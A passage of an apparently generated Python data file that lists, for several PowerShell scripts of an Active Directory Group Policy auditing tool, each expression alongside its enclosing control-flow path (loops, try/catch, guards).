                "foreach ($gSid in $groupSids)",
                "try",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "$memberSids.Count",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "try",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "try",
                "foreach ($gSid in $groupSids)",
                "catch []",
            ),
        ),
        (
            "$dom.DNSRoot",
            (
                "guard if ($DryRun) -> return",
                "try",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "catch []",
            ),
        ),
        (
            "$dom.DNSRoot",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "$dom.DNSRoot",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "$pf.FullName",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "try",
            ),
        ),
        (
            "$pf.Name",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$pf.Name",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "foreach ($pf in $policyFolders)",
                "catch []",
            ),
        ),
        (
            "$_.FullName",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            (
                "@(Get-ChildItem -LiteralPath $dest -Recurse -File -ErrorAction "
                "SilentlyContinue).Count"
            ),
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
            ),
        ),
        (
            "$policyFolders.Count",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if-condition after []",
            ),
        ),
        (
            "$policyFolders.Count",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
                "if-condition after []",
            ),
        ),
        (
            "$srcErr[0].Exception.Message",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
                "if ($policyFolders.Count -eq 0) after []",
                "if ($srcErr) after []",
            ),
        ),
        (
            "$srcErr[0].Exception",
            (
                "guard if ($DryRun) -> return",
                "else of [($SkipSysvol)]",
                "if ($policyFolders.Count -eq 0 -or $copiedCount -eq 0) after []",
                "if ($policyFolders.Count -eq 0) after []",
                "if ($srcErr) after []",
            ),
        ),
        (
            "$successSections.Count",
            ("guard if ($DryRun) -> return",),
        ),
        (
            "$failedSections.Count",
            (
                "guard if ($DryRun) -> return",
                "if-condition after []",
            ),
        ),
        (
            "$failedSections.Count",
            (
                "guard if ($DryRun) -> return",
                "if ($failedSections.Count -gt 0) after []",
            ),
        ),
    ),
    "Export-GroupMembers.ps1": (
        (
            "Get-Content $PrincipalsPath -Raw -Encoding UTF8",
            (),
        ),
        (
            "ConvertFrom-Json",
            (),
        ),
        (
            'Where-Object { $_.Value.type -eq "Group" }',
            (),
        ),
        (
            'Write-Host "Found $($groups.Count) groups to expand"',
            (),
        ),
        (
            'Write-Host " Expanding $name ($sid)..."',
            ("foreach ($grp in $groups)",),
        ),
        (
            "Get-ADGroupMember -Identity $sid -Recursive @adParams -ErrorAction Stop",
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            'Write-Host " $($memberSids.Count) members"',
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            'Write-Host " FAIL: $($_.Exception.Message)"',
            (
                "foreach ($grp in $groups)",
                "catch []",
            ),
        ),
        (
            'Get-Date -Format "o"',
            (),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (),
        ),
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
        (
            'Write-Host "Done: $expanded expanded, $failed failed -> $OutputPath"',
            (),
        ),
        (
            "$adParams.Credential",
            ("if ($Credential) after []",),
        ),
        (
            "$principalsData.principals.PSObject.Properties",
            (),
        ),
        (
            "$principalsData.principals.PSObject",
            (),
        ),
        (
            "$principalsData.principals",
            (),
        ),
        (
            "$_.Value.type",
            ("scriptblock positional of Where-Object",),
        ),
        (
            "$_.Value",
            ("scriptblock positional of Where-Object",),
        ),
        (
            "$groups.Count",
            (),
        ),
        (
            "$grp.Name",
            ("foreach ($grp in $groups)",),
        ),
        (
            "$grp.Value.name",
            ("foreach ($grp in $groups)",),
        ),
        (
            "$grp.Value",
            ("foreach ($grp in $groups)",),
        ),
        (
            "$m.SID",
            (
                "foreach ($grp in $groups)",
                "try",
                "foreach ($m in $members)",
                "if-condition after []",
            ),
        ),
        (
            "$m.SID.Value",
            (
                "foreach ($grp in $groups)",
                "try",
                "foreach ($m in $members)",
                "if ($m.SID) after []",
            ),
        ),
        (
            "$m.SID",
            (
                "foreach ($grp in $groups)",
                "try",
                "foreach ($m in $members)",
                "if ($m.SID) after []",
            ),
        ),
        (
            "$memberSids.Count",
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            "$memberSids.Count",
            (
                "foreach ($grp in $groups)",
                "try",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "foreach ($grp in $groups)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "foreach ($grp in $groups)",
                "catch []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "foreach ($grp in $groups)",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "foreach ($grp in $groups)",
                "catch []",
            ),
        ),
        (
            "$principalsData.domain",
            (),
        ),
    ),
    "Export-Principals.ps1": (
        (
            "Test-Path $SddlSource",
            ("if-condition after []",),
        ),
        (
            'Write-Host "Reading SDDL from: $SddlSource"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            'Join-Path $SddlSource "AllGPOs.xml"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $allXml",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            'Join-Path $SddlSource "reports"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $reportsDir",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            'Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction SilentlyContinue',
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $reportsDir) after []",
            ),
        ),
        (
            "Get-Content $f -Raw -ErrorAction Stop",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            'Join-Path $SddlSource "gpo-metadata.json"',
            ("if ($SddlSource -and (Test-Path $SddlSource)) after []",),
        ),
        (
            "Test-Path $metaFile",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if-condition after []",
            ),
        ),
        (
            "Get-Content $metaFile -Raw",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
            ),
        ),
        (
            'Write-Host "Collecting SDDL from live AD via Get-ADObject..."',
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            "Get-ADDomain @adParams",
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            (
                "Get-ADObject -SearchBase $policiesDN -LDAPFilter "
                '"(objectClass=groupPolicyContainer)" -Properties nTSecurityDescriptor, '
                "displayName @adParams"
            ),
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            'Write-Host "Found $($allSids.Count) unique SIDs to resolve"',
            (),
        ),
        (
            "Sort-Object",
            ("foreach ($sid in $allSids | Sort-Object)",),
        ),
        (
            "New-Object System.Security.Principal.SecurityIdentifier($sid)",
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            'Write-Host " $sid -> $translated"',
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            'Write-Host " $sid -> (unresolved)"',
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "catch []",
            ),
        ),
        (
            "Where-Object { $_ -match '^S-1-5-21-' -and $principals[$_].type -eq 'Unresolved' }",
            (),
        ),
        (
            'Write-Host "Resolving $($domainSids.Count) domain SIDs via Get-ADObject..."',
            ("if ($domainSids.Count -gt 0) after []",),
        ),
        (
            "Get-ADDomain @adParams",
            (
                "if ($domainSids.Count -gt 0) after []",
                "if (-not $dom) after []",
                "try",
            ),
        ),
        (
            (
                "Get-ADObject -Filter \"objectSid -eq '$sid'\" -Properties objectClass, "
                "sAMAccountName, name @adParams -ErrorAction Stop"
            ),
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
            ),
        ),
        (
            'Write-Host " AD: $sid -> $sam ($ptype)"',
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            'Write-Host " AD resolve failed for $sid : $($_.Exception.Message)"',
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "catch []",
            ),
        ),
        (
            'Get-Date -Format "o"',
            (),
        ),
        (
            "ConvertTo-Json -Depth 5",
            (),
        ),
        (
            "Set-Content $OutputPath -Encoding UTF8",
            (),
        ),
        (
            'Write-Host "Done: $resolved resolved, $unresolved unresolved -> $OutputPath"',
            (),
        ),
        (
            (
                "[System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ord"
                "inalIgnoreCase)"
            ),
            (),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "[regex]::Matches($content, 'S-1-[0-9]+-[0-9-]+')",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "$sd.GetSecurityDescriptorSddlForm()",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
                "if ($sd) after []",
            ),
        ),
        (
            "[regex]::Matches($sddl, 'S-1-[0-9]+-[0-9-]+')",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
                "if ($sd) after []",
            ),
        ),
        (
            "$allSids.Add($m.Value)",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
                "if ($sd) after []",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "$sidObj.Translate([System.Security.Principal.NTAccount])",
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            "[System.StringComparer]::OrdinalIgnoreCase",
            (),
        ),
        (
            '(Get-ChildItem $reportsDir -Filter "*.xml" -ErrorAction SilentlyContinue).FullName',
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $reportsDir) after []",
            ),
        ),
        (
            "$m.Value",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "foreach ($f in $xmlFiles)",
                "try",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "$m.Value",
            (
                "if ($SddlSource -and (Test-Path $SddlSource)) after []",
                "if (Test-Path $metaFile) after []",
                "try",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "$adParams.Credential",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "if ($Credential) after []",
            ),
        ),
        (
            "$dom.DistinguishedName",
            ("else of [($SddlSource -and (Test-Path $SddlSource))]",),
        ),
        (
            "$gpc.nTSecurityDescriptor",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
            ),
        ),
        (
            "$m.Value",
            (
                "else of [($SddlSource -and (Test-Path $SddlSource))]",
                "foreach ($gpc in $gpcObjs)",
                "try",
                "if ($sd) after []",
                "foreach ($m in $matches)",
            ),
        ),
        (
            "$allSids.Count",
            (),
        ),
        (
            "$sidObj.Translate([System.Security.Principal.NTAccount]).Value",
            (
                "foreach ($sid in $allSids | Sort-Object)",
                "try",
            ),
        ),
        (
            "$principals[$_].type",
            ("scriptblock positional of Where-Object",),
        ),
        (
            "$domainSids.Count",
            ("if-condition after []",),
        ),
        (
            "$domainSids.Count",
            ("if ($domainSids.Count -gt 0) after []",),
        ),
        (
            "$adParams.Credential",
            (
                "if ($domainSids.Count -gt 0) after []",
                "if ($Credential) after []",
            ),
        ),
        (
            "$principals[$sid].type",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                "if-condition after []",
            ),
        ),
        (
            "$obj.sAMAccountName",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
                "if-condition after []",
            ),
        ),
        (
            "$obj.sAMAccountName",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
                "if ($obj.sAMAccountName) after []",
            ),
        ),
        (
            "$obj.Name",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
                "else of [($obj.sAMAccountName)]",
            ),
        ),
        (
            "$obj.objectClass",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
            ),
        ),
        (
            "$dom.NetBIOSName",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "try",
                "if ($obj) after []",
                "if ($dom) after []",
            ),
        ),
        (
            "$_.Exception.Message",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "if ($domainSids.Count -gt 0) after []",
                "foreach ($sid in $domainSids)",
                'guard if ($principals[$sid].type -ne "Unresolved") -> continue',
                "catch []",
            ),
        ),
        (
            "$dom.DNSRoot",
            ("if ($dom) after []",),
        ),
    ),
    "Run-GpoLensCollection.ps1": (
        (
            "Join-Path $PSScriptRoot 'Export-GpoEstate.ps1'",
            (),
        ),
        (
            ". (Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1')",
            (),
        ),
        (
            "Join-Path $PSScriptRoot 'GpoLensCollectionMarker.ps1'",
            (),
        ),
        (
            "Get-Date -Format o",
            ("function Write-GpoLensCollectionLog",),
        ),
        (
            "Test-Path -LiteralPath $LogPath",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $LogPath",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $next",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if-condition after []",
            ),
        ),
        (
            "Remove-Item -LiteralPath $next -Force -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $next) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $old",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if-condition after []",
            ),
        ),
        (
            "Move-Item -LiteralPath $old -Destination $next -ErrorAction Stop",
            (
                "function Write-GpoLensCollectionLog",
                (
                    "if ((Test-Path -LiteralPath $LogPath) -and (Get-Item -LiteralPath "
                    "$LogPath).Length + $bytes -gt $LogMaxBytes) after []"
                ),
                "for ($i = $LogFiles; $i -ge 1; $i--)",
                "if (Test-Path -LiteralPath $old) after []",
            ),
        ),
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip' -ErrorAction Stop",
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            (
                "Where-Object { $_.BaseName -match '^.+-\\d{8}-\\d{6}$' -and (Test-Path "
                "-LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml') "
                "-PathType Leaf) }"
            ),
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            (
                "Test-Path -LiteralPath (Join-Path (Join-Path $OutputRoot $_.BaseName) "
                "'AllGPOs.xml') -PathType Leaf"
            ),
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "Join-Path (Join-Path $OutputRoot $_.BaseName) 'AllGPOs.xml'",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "Join-Path $OutputRoot $_.BaseName",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            (
                "Sort-Object @{ Expression = { $_.BaseName.Substring($_.BaseName.Length - 15) "
                "}; Descending = $true }, Name"
            ),
            ("function Get-GpoLensCompletedExports",),
        ),
        (
            'Write-Warning "Skipping incomplete ZIP (no estate report): $($archive.Name)"',
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
                "else of [($zip.GetEntry('AllGPOs.xml'))]",
            ),
        ),
        (
            'Write-Warning "Skipping unreadable/incomplete ZIP: $($archive.Name)"',
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "catch []",
            ),
        ),
        (
            "Get-Item -LiteralPath $directory -Force",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $directory -Force",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
            ),
        ),
        (
            "Join-Path $OutputRoot '.gpo-lens-collection-owner'",
            ("function Assert-GpoLensCollectionOwner",),
        ),
        (
            "Test-Path -LiteralPath $marker -PathType Leaf",
            (
                "function Assert-GpoLensCollectionOwner",
                "if-condition after []",
            ),
        ),
        (
            "Read-GpoLensOwnerMarkerBytes -Marker $marker",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "Test-Path -LiteralPath $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.lock'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot 'collection.log'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
            ),
        ),
        (
            "Write-GpoLensCollectionLog @logArgs -Message 'Collection started'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Resolve-Path -LiteralPath $InventoryPath",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "ConvertFrom-Json",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "Get-ChildItem -LiteralPath $OutputRoot -File -Filter '*.zip'",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "ForEach-Object { $previous[$_.FullName] = $true }",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "& $CollectorPath -OutputRoot $OutputRoot *>&1",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "ForEach-Object { Write-GpoLensCollectionLog @logArgs -Message ($_ | "
                "Out-String).TrimEnd() }"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Write-GpoLensCollectionLog @logArgs -Message ($_ | Out-String).TrimEnd()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Out-String",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "Get-GpoLensCompletedExports -OutputRoot $OutputRoot",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Where-Object { -not $previous.ContainsKey($_.FullName) }",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "Join-Path $OutputRoot $newest.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "Add-Type -AssemblyName System.IO.Compression.FileSystem",
            (
                "function Invoke-GpoLensCollection",
                (
